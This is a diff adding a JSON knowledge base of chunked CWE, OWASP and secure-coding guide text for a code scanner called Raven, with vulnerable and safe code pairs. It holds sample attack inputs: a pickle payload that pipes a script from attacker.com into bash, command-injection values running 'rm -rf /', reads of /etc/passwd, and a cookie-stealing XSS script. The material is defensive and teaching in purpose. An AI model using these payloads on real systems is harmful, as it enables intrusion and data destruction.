@@ -1,0 +1,254 @@
+[
+  {
+    "source": "cwe/CWE-259.md",
+    "text": "# CWE-259: Use of Hard-coded Password\n\n## Description\n\nCWE-259 occurs when software contains a hard-coded password or secret that is used\nfor its own authentication or for authentication with external components. Hard-coded\ncredentials are static and cannot be changed without modifying the source code and\nredeploying the application.\n\n## Risk\n\n- **CVSS Score**: Up to 9.8 (Critical)\n- **Impact**: Unauthorized access to the application, database, or external services\n- **OWASP**: A02:2021 — Crypto"
+  },
+  {
+    "source": "cwe/CWE-259.md",
+    "text": "r external services\n- **OWASP**: A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures\n- **Affected Languages**: All\n\n## Vulnerable Example (Python)\n\n```python\n# VULNERABLE: hardcoded credentials\napp.secret_key = \"supersecretkey123\"\nDB_PASSWORD = \"admin123\"\nAPI_KEY = \"sk-abc123def456\"\n\n# Anyone with read access to this file has these credentials permanently\n```\n\n## Vulnerable Example (JavaScript)\n\n```javascript\n// VULNERABLE\nconst dbConfig = {\n  password: \"myp"
+  },
+  {
+    "source": "cwe/CWE-259.md",
+    "text": "// VULNERABLE\nconst dbConfig = {\n  password: \"mypassword123\",\n  apiKey: \"Bearer eyJhbGci...\"\n};\n```\n\n## Safe Example (Python)\n\n```python\n# SAFE: load from environment variables\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\napp.secret_key = os.environ[\"SECRET_KEY\"]\nDB_PASSWORD = os.environ[\"DB_PASSWORD\"]\nAPI_KEY = os.environ[\"API_KEY\"]\n```\n\n## Remediation\n\n1. **Remove all hardcoded credentials** from source code immediately.\n2. Store secrets in environment variables and load them at r"
+  },
+  {
+    "source": "cwe/CWE-259.md",
+    "text": "ecrets in environment variables and load them at runtime.\n3. Use a `.env` file (with `python-dotenv`) for local development — add `.env` to `.gitignore`.\n4. For production, use a secrets manager: AWS Secrets Manager, HashiCorp Vault, or Azure Key Vault.\n5. **Rotate all exposed credentials immediately** if they have been committed to version control.\n6. Use git history scanning tools (e.g. `truffleHog`, `gitleaks`) to detect historical exposure."
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": "# CWE-502: Deserialization of Untrusted Data\n\n## Description\n\nCWE-502 occurs when an application deserializes data from an untrusted source without\nsufficient validation. Maliciously crafted serialized objects can trigger code execution\nduring deserialization, often before any application-level validation runs.\n\n## Risk\n\n- **CVSS Score**: Up to 9.8 (Critical)\n- **Impact**: Remote Code Execution, Denial of Service, privilege escalation\n- **OWASP**: A08:2021 — Software and Data Integrity Failures"
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": ": A08:2021 — Software and Data Integrity Failures\n- **Affected Languages**: Python (`pickle`), Java (native serialization), PHP (`unserialize`), Ruby (Marshal)\n\n## Vulnerable Example (Python)\n\n```python\n# VULNERABLE: pickle.loads() with user-controlled data\nimport pickle\nimport base64\n\ndata = request.data  # attacker-controlled bytes\nobj = pickle.loads(data)\n\n# A crafted pickle payload can execute:\n# os.system(\"curl attacker.com | bash\")\n# during deserialization — before any code in the app runs"
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": "deserialization — before any code in the app runs\n```\n\n## Crafted Attack Payload\n\n```python\nimport pickle, os\n\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"curl http://attacker.com/shell.sh | bash\",))\n\npayload = pickle.dumps(Exploit())\n# Sending this payload to pickle.loads() executes the command\n```\n\n## Safe Example (Python)\n\n```python\n# SAFE: use JSON for data exchange instead of pickle\nimport json\n\ndata = request.get_json()  # parses JSON, cannot execute code"
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": "est.get_json()  # parses JSON, cannot execute code\n\n# SAFE: if pickle is unavoidable, use HMAC signing to verify integrity\nimport hmac, hashlib, pickle\n\nSECRET = os.environ[\"PICKLE_SECRET\"]\n\ndef safe_loads(data: bytes, signature: bytes) -> object:\n    expected = hmac.new(SECRET.encode(), data, hashlib.sha256).digest()\n    if not hmac.compare_digest(expected, signature):\n        raise ValueError(\"Invalid signature — data may be tampered\")\n    return pickle.loads(data)\n```\n\n## Remediation\n\n1. **Ne"
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": "rn pickle.loads(data)\n```\n\n## Remediation\n\n1. **Never deserialize pickle, marshal, or Java serialization data from untrusted sources.**\n2. Use safe, language-neutral formats: JSON, MessagePack, or Protocol Buffers.\n3. If pickle is required, verify data integrity with HMAC before deserialization.\n4. Run deserialization in an isolated process or container with no network access.\n5. Keep deserialization libraries updated to patch known gadget chains."
+  },
+  {
+    "source": "cwe/CWE-502.md",
+    "text": "."
+  },
+  {
+    "source": "cwe/CWE-78.md",
+    "text": "# CWE-78: OS Command Injection\n\n## Description\n\nOS Command Injection (CWE-78) occurs when an application constructs an operating system\ncommand using externally-influenced input. If the input is not properly validated or\nsanitized, an attacker can modify the intended command or inject additional commands.\n\n## Risk\n\n- **CVSS Score**: Up to 9.8 (Critical)\n- **Impact**: Full system compromise, arbitrary command execution as the application user\n- **OWASP**: A03:2021 — Injection\n- **Affected Languag"
+  },
+  {
+    "source": "cwe/CWE-78.md",
+    "text": "OWASP**: A03:2021 — Injection\n- **Affected Languages**: Python, JavaScript, Go, PHP, Java, Ruby\n\n## Vulnerable Example (Python)\n\n```python\n# VULNERABLE: user input injected directly into shell command\nimport subprocess\nhostname = request.args.get(\"host\")\noutput = subprocess.check_output(f\"ping -c 1 {hostname}\", shell=True)\n\n# Attacker sends: host=localhost; rm -rf /\n# Result: ping runs AND rm -rf / executes\n```\n\n## Safe Example (Python)\n\n```python\n# SAFE: use list of args with shell=False (defau"
+  },
+  {
+    "source": "cwe/CWE-78.md",
+    "text": "n\n# SAFE: use list of args with shell=False (default)\nimport subprocess\nimport shlex\nhostname = request.args.get(\"host\", \"\")\n# Validate input strictly\nif not hostname.replace(\".\", \"\").isalnum():\n    raise ValueError(\"Invalid hostname\")\noutput = subprocess.run([\"ping\", \"-c\", \"1\", hostname], capture_output=True, shell=False)\n```\n\n## Remediation\n\n1. **Never pass user input directly to shell commands.**\n2. Use `subprocess` with `shell=False` and pass arguments as a list.\n3. Whitelist allowed charact"
+  },
+  {
+    "source": "cwe/CWE-78.md",
+    "text": "arguments as a list.\n3. Whitelist allowed characters in user-supplied parameters.\n4. Apply the principle of least privilege — run the application with minimal OS permissions.\n5. Use dedicated libraries for tasks like DNS lookups instead of shelling out."
+  },
+  {
+    "source": "cwe/CWE-79.md",
+    "text": "# CWE-79: Cross-Site Scripting (XSS)\n\n## Description\n\nCross-Site Scripting (CWE-79) occurs when an application includes user-controllable\ndata in output sent to a web browser without properly encoding or validating it.\nAn attacker can inject client-side scripts that execute in the victim's browser.\n\n## Risk\n\n- **CVSS Score**: Up to 8.8 (High)\n- **Impact**: Session hijacking, credential theft, malware delivery, page defacement\n- **OWASP**: A03:2021 — Injection\n- **Affected Languages**: JavaScript"
+  },
+  {
+    "source": "cwe/CWE-79.md",
+    "text": "1 — Injection\n- **Affected Languages**: JavaScript, TypeScript, JSX, TSX, HTML templates\n\n## Vulnerable Example (React)\n\n```jsx\n// VULNERABLE: user content rendered as raw HTML\nfunction UserComment({ comment }) {\n  return <div dangerouslySetInnerHTML={{ __html: comment }} />;\n}\n\n// Attacker submits: <script>document.cookie='stolen='+document.cookie</script>\n```\n\n## Vulnerable Example (Vanilla JS)\n\n```javascript\n// VULNERABLE: innerHTML with user input\nconst name = new URLSearchParams(window.loca"
+  },
+  {
+    "source": "cwe/CWE-79.md",
+    "text": "input\nconst name = new URLSearchParams(window.location.search).get(\"name\");\ndocument.getElementById(\"greeting\").innerHTML = \"Hello, \" + name;\n```\n\n## Safe Example (React)\n\n```jsx\n// SAFE: render as text, not HTML\nfunction UserComment({ comment }) {\n  return <div>{comment}</div>;  // React escapes this automatically\n}\n\n// SAFE: sanitize if HTML rendering is required\nimport DOMPurify from \"dompurify\";\nfunction UserComment({ comment }) {\n  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sa"
+  },
+  {
+    "source": "cwe/CWE-79.md",
+    "text": "iv dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />;\n}\n```\n\n## Remediation\n\n1. **Use framework-provided escaping** (React JSX, Django templates, Jinja2 auto-escape).\n2. Avoid `innerHTML`, `document.write()`, and `dangerouslySetInnerHTML` with unsanitized data.\n3. Apply a Content Security Policy (CSP) header to restrict script sources.\n4. Sanitize HTML with DOMPurify before inserting into the DOM.\n5. Use `textContent` instead of `innerHTML` when displaying plain text."
+  },
+  {
+    "source": "cwe/CWE-79.md",
+    "text": "f `innerHTML` when displaying plain text."
+  },
+  {
+    "source": "cwe/CWE-89.md",
+    "text": "# CWE-89: SQL Injection\n\n## Description\n\nSQL Injection (CWE-89) occurs when user-supplied data is incorporated into an SQL query\nwithout proper neutralization. This allows attackers to manipulate the query's logic,\nbypass authentication, read sensitive data, modify or delete database records, or\nin some configurations, execute OS commands.\n\n## Risk\n\n- **CVSS Score**: Up to 9.8 (Critical)\n- **Impact**: Authentication bypass, full database exfiltration, data modification, RCE\n- **OWASP**: A03:2021"
+  },
+  {
+    "source": "cwe/CWE-89.md",
+    "text": "tion, data modification, RCE\n- **OWASP**: A03:2021 — Injection\n- **Affected Languages**: Python, JavaScript, PHP, Java, Go, Ruby\n\n## Vulnerable Example (Python)\n\n```python\n# VULNERABLE: f-string SQL — direct user input interpolation\nusername = request.form[\"username\"]\nquery = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)\n\n# Attacker sends: username = ' OR '1'='1\n# Result: query becomes SELECT * FROM users WHERE username = '' OR '1'='1'\n# All users returned — authenti"
+  },
+  {
+    "source": "cwe/CWE-89.md",
+    "text": "me = '' OR '1'='1'\n# All users returned — authentication bypassed\n```\n\n## Vulnerable Example (Python — concatenation)\n\n```python\n# VULNERABLE: string concatenation\nquery = \"SELECT * FROM users WHERE id = \" + user_id\ncursor.execute(query)\n```\n\n## Safe Example (Python)\n\n```python\n# SAFE: parameterized query — user data never touches the SQL string\nusername = request.form[\"username\"]\ncursor.execute(\"SELECT * FROM users WHERE username = %s\", (username,))\n\n# SAFE: using SQLAlchemy ORM\nuser = session."
+  },
+  {
+    "source": "cwe/CWE-89.md",
+    "text": "e,))\n\n# SAFE: using SQLAlchemy ORM\nuser = session.query(User).filter(User.username == username).first()\n```\n\n## Remediation\n\n1. **Always use parameterized queries** (also called prepared statements).\n2. Use an ORM (SQLAlchemy, Django ORM, GORM) that handles parameterization automatically.\n3. Apply input validation — whitelist expected character sets.\n4. Implement least-privilege database accounts (no DROP/DELETE unless necessary).\n5. Enable database query logging and alerting for anomalous patte"
+  },
+  {
+    "source": "cwe/CWE-89.md",
+    "text": "ase query logging and alerting for anomalous patterns."
+  },
+  {
+    "source": "cwe/CWE-94.md",
+    "text": "# CWE-94: Code Injection\n\n## Description\n\nCode Injection (CWE-94) occurs when an application evaluates attacker-controlled data\nas code. Unlike OS Command Injection (CWE-78), this executes code within the application's\nown runtime environment (e.g. Python interpreter, JavaScript engine).\n\n## Risk\n\n- **CVSS Score**: Up to 9.8 (Critical)\n- **Impact**: Remote Code Execution within the application process, full server compromise\n- **OWASP**: A03:2021 — Injection\n- **Affected Languages**: Python (`ev"
+  },
+  {
+    "source": "cwe/CWE-94.md",
+    "text": "— Injection\n- **Affected Languages**: Python (`eval`, `exec`), JavaScript (`eval`, `new Function`)\n\n## Vulnerable Example (Python)\n\n```python\n# VULNERABLE: eval() with user-controlled input\nuser_formula = request.args.get(\"formula\")\nresult = eval(user_formula)\n\n# Attacker sends: formula=__import__('os').system('rm+-rf+/')\n# Result: arbitrary OS command executed\n```\n\n## Vulnerable Example (JavaScript)\n\n```javascript\n// VULNERABLE: eval() with user input\nconst expression = req.query.expr;\nconst r"
+  },
+  {
+    "source": "cwe/CWE-94.md",
+    "text": "r input\nconst expression = req.query.expr;\nconst result = eval(expression);\n\n// Attacker sends: expr=require('child_process').execSync('cat /etc/passwd')\n```\n\n## Safe Example (Python)\n\n```python\n# SAFE: use ast.literal_eval for safe evaluation of Python literals only\nimport ast\nuser_input = request.args.get(\"data\")\nresult = ast.literal_eval(user_input)  # Only parses strings, numbers, lists, dicts, etc.\n\n# SAFE: use explicit parsing for math expressions\nimport operator\n# Use a dedicated math exp"
+  },
+  {
+    "source": "cwe/CWE-94.md",
+    "text": "essions\nimport operator\n# Use a dedicated math expression parser, NOT eval()\n```\n\n## Remediation\n\n1. **Never use `eval()` or `exec()`** with external data.\n2. Use `ast.literal_eval()` for parsing Python literals safely.\n3. Use `JSON.parse()` for JSON data instead of `eval()` in JavaScript.\n4. For mathematical expressions, use a sandboxed expression evaluator library.\n5. Apply defense-in-depth: run the application in a container with resource limits."
+  },
+  {
+    "source": "cwe/CWE-94.md",
+    "text": "ts."
+  },
+  {
+    "source": "owasp/A02_Cryptographic_Failures.md",
+    "text": "# OWASP A02:2021 — Cryptographic Failures\n\n## Description\n\nCryptographic Failures (formerly \"Sensitive Data Exposure\") covers failures related\nto cryptography that often lead to exposure of sensitive data. This includes using\nweak or broken cryptographic algorithms, hardcoding secrets, transmitting data in\ncleartext, or improper key management.\n\n## Risk\n\n- **CVSS Range**: 5.0 – 9.8\n- **Impact**: Exposure of passwords, credit cards, health records, PII; account takeover\n- **CWE Coverage**: CWE-25"
+  },
+  {
+    "source": "owasp/A02_Cryptographic_Failures.md",
+    "text": ", PII; account takeover\n- **CWE Coverage**: CWE-259, CWE-321, CWE-326, CWE-327, CWE-330, CWE-798\n\n## Common Vulnerable Patterns\n\n### Hardcoded Secrets\n```python\n# VULNERABLE\nSECRET_KEY = \"mysecretkey\"\nAPI_TOKEN = \"Bearer abc123xyz\"\n\n# SAFE\nimport os\nSECRET_KEY = os.environ[\"SECRET_KEY\"]\n```\n\n### Weak Hashing (MD5/SHA1 for passwords)\n```python\n# VULNERABLE — MD5 is cryptographically broken\nimport hashlib\nhashed = hashlib.md5(password.encode()).hexdigest()\n\n# SAFE — use bcrypt or argon2 with salt"
+  },
+  {
+    "source": "owasp/A02_Cryptographic_Failures.md",
+    "text": "digest()\n\n# SAFE — use bcrypt or argon2 with salt\nimport bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n```\n\n### HTTP instead of HTTPS\n```python\n# VULNERABLE\nrequests.get(\"http://api.example.com/sensitive-data\")\n\n# SAFE\nrequests.get(\"https://api.example.com/sensitive-data\", verify=True)\n```\n\n## Remediation Checklist\n\n- [ ] Remove all hardcoded passwords, API keys, and tokens\n- [ ] Use environment variables or secrets managers for all credentials\n- [ ] Use strong, modern passw"
+  },
+  {
+    "source": "owasp/A02_Cryptographic_Failures.md",
+    "text": "for all credentials\n- [ ] Use strong, modern password hashing: `bcrypt`, `argon2`, or `scrypt`\n- [ ] Enforce TLS 1.2+ for all data in transit\n- [ ] Use AES-256-GCM or ChaCha20-Poly1305 for symmetric encryption\n- [ ] Rotate keys regularly and have a key revocation procedure\n- [ ] Never log sensitive data (passwords, tokens, SSNs)"
+  },
+  {
+    "source": "owasp/A03_Injection.md",
+    "text": "# OWASP A03:2021 — Injection\n\n## Description\n\nInjection vulnerabilities occur when hostile data is sent to an interpreter as part\nof a command or query. The attacker's data can trick the interpreter into executing\nunintended commands or accessing unauthorized data.\n\nInjection covers: SQL Injection, Command Injection, LDAP Injection, XPath Injection,\nNoSQL Injection, Template Injection (SSTI), and Code Injection.\n\n## Risk\n\n- **CVSS Range**: 5.0 – 9.8\n- **Impact**: Data theft, authentication bypas"
+  },
+  {
+    "source": "owasp/A03_Injection.md",
+    "text": "9.8\n- **Impact**: Data theft, authentication bypass, Remote Code Execution, full system compromise\n- **CWE Coverage**: CWE-77, CWE-78, CWE-79, CWE-89, CWE-90, CWE-94\n\n## Common Vulnerable Patterns\n\n### SQL Injection\n```python\n# VULNERABLE\nquery = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\ncursor.execute(query)\n\n# SAFE\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (username,))\n```\n\n### Command Injection\n```python\n# VULNERABLE\noutput = subprocess.check_output(f\"ping {host}\", she"
+  },
+  {
+    "source": "owasp/A03_Injection.md",
+    "text": "tput = subprocess.check_output(f\"ping {host}\", shell=True)\n\n# SAFE\noutput = subprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, capture_output=True)\n```\n\n### Server-Side Template Injection (SSTI)\n```python\n# VULNERABLE — Flask/Jinja2\nfrom flask import render_template_string\ntemplate = f\"Hello {request.args.get('name')}\"\nreturn render_template_string(template)  # {{7*7}} returns 49\n\n# SAFE\nreturn render_template(\"hello.html\", name=request.args.get(\"name\"))\n```\n\n## Remediation Checklist\n\n- [ ]"
+  },
+  {
+    "source": "owasp/A03_Injection.md",
+    "text": "get(\"name\"))\n```\n\n## Remediation Checklist\n\n- [ ] Use parameterized queries / prepared statements for all database calls\n- [ ] Use an ORM that handles escaping automatically\n- [ ] Validate all input against a strict allowlist\n- [ ] Use `shell=False` for all subprocess calls\n- [ ] Use template engines correctly (pass variables, do not interpolate into template strings)\n- [ ] Apply context-aware output encoding for web outputs\n- [ ] Use LIMIT clauses to prevent mass data disclosure from SQLi"
+  },
+  {
+    "source": "owasp/A03_Injection.md",
+    "text": "es to prevent mass data disclosure from SQLi"
+  },
+  {
+    "source": "owasp/A06_Vulnerable_Components.md",
+    "text": "# OWASP A06:2021 — Vulnerable and Outdated Components\n\n## Description\n\nA06 covers the use of software components (libraries, frameworks, other modules) with\nknown vulnerabilities. Components run with the same privileges as the application, so\na vulnerability in a component can lead to data loss, takeover, or server compromise.\n\n## Risk\n\n- **CVSS Range**: Varies (can be Critical)\n- **Impact**: Varies by CVE — from information disclosure to full RCE\n- **CWE Coverage**: CWE-1035, CWE-1104, CWE-1395"
+  },
+  {
+    "source": "owasp/A06_Vulnerable_Components.md",
+    "text": "E\n- **CWE Coverage**: CWE-1035, CWE-1104, CWE-1395\n\n## Common Examples\n\n### Outdated Python Package\n```\n# requirements.txt\nFlask==2.0.2   # CVE-2023-30861 — Vary header not set correctly (session leakage)\nrequests==2.18.0  # Multiple historical CVEs\n```\n\n### Outdated npm Package\n```json\n{\n  \"dependencies\": {\n    \"axios\": \"0.18.0\",   // CVE-2019-10742 — ReDoS\n    \"lodash\": \"4.0.0\"    // CVE-2019-10744 — Prototype Pollution\n  }\n}\n```\n\n## Detection Tools\n\n- **Python**: `pip-audit -r requirements.tx"
+  },
+  {
+    "source": "owasp/A06_Vulnerable_Components.md",
+    "text": "Tools\n\n- **Python**: `pip-audit -r requirements.txt`\n- **JavaScript**: `npm audit` or `yarn audit`\n- **Go**: `govulncheck ./...`\n- **All**: GitHub Dependabot, Snyk, OWASP Dependency-Check\n\n## Remediation Checklist\n\n- [ ] Maintain an inventory of all components and their versions\n- [ ] Subscribe to security advisories for your core dependencies\n- [ ] Use `pip-audit`, `npm audit`, or `govulncheck` in your CI/CD pipeline\n- [ ] Pin dependency versions in `requirements.txt` / `package-lock.json`\n- ["
+  },
+  {
+    "source": "owasp/A06_Vulnerable_Components.md",
+    "text": "s in `requirements.txt` / `package-lock.json`\n- [ ] Upgrade vulnerable packages to their patched versions promptly\n- [ ] Remove unused dependencies to reduce attack surface\n- [ ] Consider automated dependency updates (Dependabot, Renovate)"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "# Flask Security Guide\n\n## Overview\n\nFlask is a lightweight WSGI web framework. Its minimal defaults mean developers\nmust explicitly add security controls. This guide covers the most critical\nFlask-specific security issues Raven detects.\n\n## 1. Secret Key Management\n\n```python\n# VULNERABLE — hardcoded secret key\napp = Flask(__name__)\napp.secret_key = \"dev-secret-123\"\n\n# SAFE — loaded from environment\nimport os\napp.secret_key = os.environ[\"FLASK_SECRET_KEY\"]\n# Generate a strong key: python -c \"im"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "ECRET_KEY\"]\n# Generate a strong key: python -c \"import secrets; print(secrets.token_hex(32))\"\n```\n\n**Why it matters**: The secret key signs session cookies. A known key lets attackers\nforge sessions and impersonate any user.\n\n## 2. Debug Mode in Production\n\n```python\n# VULNERABLE — exposes interactive Werkzeug debugger\napp.run(debug=True)\n\n# SAFE — debug only in development, never in production\nimport os\napp.run(debug=os.environ.get(\"FLASK_DEBUG\", \"false\").lower() == \"true\")\n```\n\n**Why it matter"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": ", \"false\").lower() == \"true\")\n```\n\n**Why it matters**: Werkzeug's debugger allows arbitrary Python code execution\nfrom the browser with a PIN (or without one on older versions).\n\n## 3. Server-Side Template Injection (SSTI)\n\n```python\n# VULNERABLE — user input in template string\nfrom flask import render_template_string, request\nname = request.args.get(\"name\")\nreturn render_template_string(f\"Hello {name}!\")\n# Payload: ?name={{7*7}} renders \"Hello 49!\" — full RCE possible\n\n# SAFE — use render_templ"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "9!\" — full RCE possible\n\n# SAFE — use render_template with a file, pass variable separately\nfrom flask import render_template\nname = request.args.get(\"name\", \"\")\nreturn render_template(\"hello.html\", name=name)\n```\n\n## 4. SQL Injection via SQLite/SQLAlchemy\n\n```python\n# VULNERABLE\nquery = f\"SELECT * FROM users WHERE id = {request.args.get('id')}\"\ndb.execute(query)\n\n# SAFE — use ORM or parameterized queries\nuser = User.query.filter_by(id=request.args.get(\"id\")).first()\n# or\ndb.execute(\"SELECT * FR"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "gs.get(\"id\")).first()\n# or\ndb.execute(\"SELECT * FROM users WHERE id = :id\", {\"id\": request.args.get(\"id\")})\n```\n\n## 5. Security Headers\n\n```python\n# Install: pip install flask-talisman\nfrom flask_talisman import Talisman\nTalisman(app, content_security_policy={\n    \"default-src\": \"'self'\",\n    \"script-src\": \"'self'\",\n})\n# Adds: HSTS, X-Frame-Options, X-Content-Type-Options, CSP\n```\n\n## 6. CSRF Protection\n\n```python\n# Install: pip install flask-wtf\nfrom flask_wtf.csrf import CSRFProtect\ncsrf = CSR"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "from flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n# All POST/PUT/DELETE forms now require a CSRF token\n```\n\n## Quick Checklist\n\n- [ ] `SECRET_KEY` loaded from environment variable, not hardcoded\n- [ ] `DEBUG=False` in production\n- [ ] All database queries use parameterized statements or ORM\n- [ ] Never use `render_template_string()` with user input\n- [ ] Enable HTTPS (`SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_HTTPONLY=True`)\n- [ ] Apply security headers with `flask-talisman`\n-"
+  },
+  {
+    "source": "secure_coding/flask_security.md",
+    "text": "] Apply security headers with `flask-talisman`\n- [ ] Enable CSRF protection with `flask-wtf`"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "# JavaScript / TypeScript Secure Coding Guide\n\n## Overview\n\nThis guide covers critical JavaScript and TypeScript security patterns in\nbrowser and Node.js environments that Raven's rule engine detects.\n\n## 1. eval() and Dynamic Code Execution\n\n```javascript\n// VULNERABLE\nconst expr = req.query.formula;\nconst result = eval(expr);   // RCE in Node.js, XSS in browser\n\n// ALSO VULNERABLE — same risk as eval()\nconst fn = new Function(\"return \" + expr);\n\n// SAFE — use explicit parsing\nconst num = parse"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "// SAFE — use explicit parsing\nconst num = parseFloat(req.query.value);  // for numbers\nconst data = JSON.parse(req.body);         // for data structures\n```\n\n## 2. XSS via innerHTML\n\n```javascript\n// VULNERABLE — browser XSS\nconst name = new URLSearchParams(location.search).get(\"name\");\ndocument.getElementById(\"greeting\").innerHTML = \"Hello, \" + name;\n\n// SAFE — use textContent (no HTML rendering)\ndocument.getElementById(\"greeting\").textContent = \"Hello, \" + name;\n\n// SAFE — sanitize if HTML"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "t = \"Hello, \" + name;\n\n// SAFE — sanitize if HTML is needed\nimport DOMPurify from \"dompurify\";\nelement.innerHTML = DOMPurify.sanitize(userHtml);\n```\n\n## 3. React dangerouslySetInnerHTML\n\n```jsx\n// VULNERABLE\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// SAFE — use JSX rendering (React escapes by default)\n<div>{userInput}</div>\n\n// SAFE — sanitize if raw HTML is required\nimport DOMPurify from \"dompurify\";\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />\n``"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "={{ __html: DOMPurify.sanitize(userInput) }} />\n```\n\n## 4. SQL Injection in Node.js\n\n```javascript\n// VULNERABLE — string concatenation\nconst query = \"SELECT * FROM users WHERE id = \" + req.params.id;\ndb.query(query, callback);\n\n// SAFE — parameterized query\ndb.query(\"SELECT * FROM users WHERE id = ?\", [req.params.id], callback);\n\n// SAFE — using an ORM (Sequelize, Prisma)\nconst user = await User.findByPk(req.params.id);\n```\n\n## 5. Prototype Pollution\n\n```javascript\n// VULNERABLE\nfunction merge("
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "ution\n\n```javascript\n// VULNERABLE\nfunction merge(target, source) {\n  for (let key in source) {\n    target[key] = source[key];  // attacker can set __proto__\n  }\n}\nmerge({}, JSON.parse('{\"__proto__\": {\"admin\": true}}'));\n\n// SAFE — use Object.create(null) or validate keys\nfunction safeMerge(target, source) {\n  for (let key of Object.keys(source)) {\n    if (key !== \"__proto__\" && key !== \"constructor\") {\n      target[key] = source[key];\n    }\n  }\n}\n```\n\n## 6. npm Dependency Vulnerabilities\n\n```ba"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "}\n```\n\n## 6. npm Dependency Vulnerabilities\n\n```bash\n# Check for vulnerabilities\nnpm audit\n\n# Auto-fix non-breaking updates\nnpm audit fix\n\n# Check specific package\nnpm audit --package lodash\n```\n\n## Security Checklist\n\n- [ ] Never use `eval()` or `new Function()` with user data\n- [ ] Use `textContent` instead of `innerHTML` for plain text\n- [ ] Sanitize HTML with DOMPurify before `innerHTML` assignment\n- [ ] Use parameterized queries for all database access\n- [ ] Run `npm audit` regularly and in"
+  },
+  {
+    "source": "secure_coding/javascript_secure_coding.md",
+    "text": "base access\n- [ ] Run `npm audit` regularly and in CI/CD\n- [ ] Set Content Security Policy (CSP) headers\n- [ ] Validate and sanitize all user inputs server-side"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "# Python Secure Coding Guide\n\n## Overview\n\nThis guide covers the most critical Python-specific security patterns that\nRaven's rule engine detects and the LLM analyzes.\n\n## 1. Code Execution — eval() and exec()\n\n```python\n# VULNERABLE\nuser_input = request.args.get(\"formula\")\nresult = eval(user_input)  # RCE if input is __import__('os').system('...')\n\n# SAFE — use ast.literal_eval for literals\nimport ast\nresult = ast.literal_eval(user_input)  # Only parses literals, not code\n\n# SAFE — use a proper"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "y parses literals, not code\n\n# SAFE — use a proper expression parser for math\nimport numexpr  # or sympy — dedicated, sandboxed math evaluation\n```\n\n## 2. Subprocess — Command Injection\n\n```python\n# VULNERABLE\nimport subprocess\nhost = request.args.get(\"host\")\nsubprocess.run(f\"ping -c 1 {host}\", shell=True)\n\n# SAFE — list of args, shell=False\nimport subprocess, re\nhost = request.args.get(\"host\", \"\")\nif not re.match(r'^[a-zA-Z0-9.\\-]+$', host):  # Whitelist\n    raise ValueError(\"Invalid host\")\nsub"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "Whitelist\n    raise ValueError(\"Invalid host\")\nsubprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, timeout=5)\n```\n\n## 3. Deserialization — pickle\n\n```python\n# VULNERABLE\nimport pickle\ndata = request.data\nobj = pickle.loads(data)  # Arbitrary code execution\n\n# SAFE — use JSON\nimport json\nobj = json.loads(request.data)\n\n# SAFE — HMAC-signed pickle (if pickle is unavoidable)\nimport hmac, hashlib\nSECRET = os.environ[\"SIGN_SECRET\"].encode()\nsig = hmac.new(SECRET, data, hashlib.sha256).digest()\nass"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "mac.new(SECRET, data, hashlib.sha256).digest()\nassert hmac.compare_digest(sig, expected_sig), \"Tampered!\"\nobj = pickle.loads(data)\n```\n\n## 4. SQL Injection\n\n```python\n# VULNERABLE — f-string interpolation\ncursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n\n# SAFE — parameterized query\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\n# SAFE — SQLAlchemy ORM\nuser = session.query(User).filter(User.id == user_id).first()\n```\n\n## 5. Path Traversal\n\n```python\n# VULNERABLE\nfile"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "## 5. Path Traversal\n\n```python\n# VULNERABLE\nfilename = request.args.get(\"file\")\nwith open(f\"/app/data/{filename}\") as f:  # ../../../etc/passwd\n    return f.read()\n\n# SAFE — resolve and validate\nfrom pathlib import Path\nbase = Path(\"/app/data\").resolve()\ntarget = (base / filename).resolve()\nif not str(target).startswith(str(base)):\n    raise PermissionError(\"Path traversal detected\")\nwith open(target) as f:\n    return f.read()\n```\n\n## 6. Secrets Management\n\n```python\n# VULNERABLE\nDB_PASSWORD ="
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
